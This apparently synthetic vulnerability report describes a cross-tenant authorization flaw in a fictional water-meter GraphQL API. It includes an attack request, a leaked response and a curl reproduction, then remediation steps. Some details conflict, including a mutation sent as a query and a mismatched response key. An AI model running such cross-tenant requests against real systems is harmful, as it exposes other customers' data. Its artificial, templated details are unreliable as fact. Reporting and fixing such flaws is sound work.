# Security Analysis Report
**System:** AquaGrid Meter Management
**Domain:** Water Utilities / Smart Meters
**Example ID:** GQL-0289
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.3 | Bulk endpoint without ownership filter on `bulkResourceLookup` — attacker from `tenant-f4ec` reads smart meter records owned by `tenant-9a69` |

---

## Finding 1 — BOLA: Bulk Endpoint Without Ownership Filter (Pattern 1.3)

### Summary
The `bulkResourceLookup` mutation on AquaGrid Meter Management (`api.aquagrid-meter-manag.example.com`) accepts an array of `resourceId` values without filtering by the JWT's `tenantId`. Per §5.0 Pattern 1.3, bulk endpoints that do not enforce per-ID tenancy allow an attacker to enumerate records across tenants. The Redis cache is keyed by `resourceId` only, amplifying the risk.

**Context.txt inconsistency (documented):** The HAR request uses the `bulkResourceLookup` mutation, but the response JSON contains the key `getResource`. These names conflict. The HAR (§6.0) request is the primary evidence for the exploit path.

**Note on `x-request-id`:** This appears as a *response* header (`"x-request-id": "req-f4ec9a69"`). It is server-assigned and must NOT be sent as a request header.

**Pattern:** 1.3 — Bulk or list endpoints (BOLA)
**Affected resolver:** `bulkResourceLookup`
**Affected endpoint:** `POST https://api.aquagrid-meter-manag.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack (attacker JWT: `tenant-f4ec`)**
```
POST https://api.aquagrid-meter-manag.example.com/graphql
authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
content-type: application/json
x-tenant-id: tenant-f4ec

{"query": "query VulnerableOp { bulkResourceLookup(ids: [\"R-2289\", \"R-1289\", \"R-3289\"]) { resourceId tenantId data { sensitiveField } } }"}
```

**Response — Cross-Tenant Resource Returned**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-9a69",
      "ownerId": "other-user-f4ec9a69",
      "data": {
        "sensitiveField": "CONFIDENTIAL-f4ec9a69",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
*`x-request-id: req-f4ec9a69` — server-assigned response header, confirms cross-tenant access.*

### Steps to Reproduce
```bash
curl -s -X POST "https://api.aquagrid-meter-manag.example.com/graphql" \
  -H "authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "content-type: application/json" \
  -H "x-tenant-id: tenant-f4ec" \
  -d '{"query": "query VulnerableOp { bulkResourceLookup(ids: [\"R-2289\", \"R-1289\", \"R-3289\"]) { resourceId tenantId data { sensitiveField } } }"}'
# Vulnerable: tenantId: tenant-9a69 returned for tenant-f4ec caller
# Secure: {"errors":[{"message":"Forbidden"}]}
```

### Remediation
1. In `bulkResourceLookup`, validate each resolved object's `tenantId` against JWT `tenantId`.
2. Filter or reject results that cross tenant boundaries.
3. Key Redis cache on `tenantId:resourceId` composite, not `resourceId` alone.
